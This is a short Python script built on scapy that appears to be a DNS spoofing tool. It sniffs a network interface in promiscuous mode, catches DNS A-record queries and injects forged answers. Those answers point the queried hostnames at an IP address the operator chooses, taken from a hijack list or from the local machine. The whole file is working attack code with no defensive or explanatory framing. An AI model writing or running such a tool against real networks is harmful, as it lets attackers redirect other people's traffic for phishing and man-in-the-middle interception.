from scapy.all import *
import argparse
import socket
import fcntl
import struct

def get_ip_address(ifname):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])


def packetSniff(interface, bpf_filt, hostPresent, hostFile):
	host_dict={}
	if hostPresent:
		hf=open(hostFile,"r")
		for line in hf:
			ip,hostname = line.split()
			host_dict[hostname.strip()] = ip.strip()
			
	conf.sniff_promisc = True	
	pkts = sniff(filter = bpf_filt, prn = lambda x: showPkts(x, hostPresent, host_dict, interface), iface = interface, count = 0)

def showPkts(pkt, hostPresent, host_dict, iface):
    	if(pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].qd.qtype == 1):
		if(hostPresent):
			hostname = str(pkt['DNS Question Record'].qname).strip()
			hostname = hostname[:-1]
			mal_ip = host_dict.get(hostname)			
			if mal_ip == None:
				return
		else:
			mal_ip = get_ip_address(iface)
		if mal_ip:
			spfResp = IP(dst=pkt[IP].src, src = pkt[IP].dst)\
			/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)\
			/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=mal_ip))
			send(spfResp, verbose=0)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='inject fake dns response', add_help=False)
	parser.add_argument("-i","--interface", help="interface to sniff on")
	parser.add_argument("-h","--hostnames", help="path to host,ip file containing hostnames to be hijacked")
	parser.add_argument('bpf', nargs=argparse.REMAINDER)
	args = parser.parse_args()
	if(args.interface):
		iface = args.interface
	else:
		iface = conf.iface	
	if(args.hostnames):
		hostPresent = True
		filePath = args.hostnames
	else:
		hostPresent = False
		filePath = None
	filterExp = " ".join(args.bpf)
	packetSniff(interface = iface, bpf_filt = filterExp, hostPresent=hostPresent, hostFile = filePath)
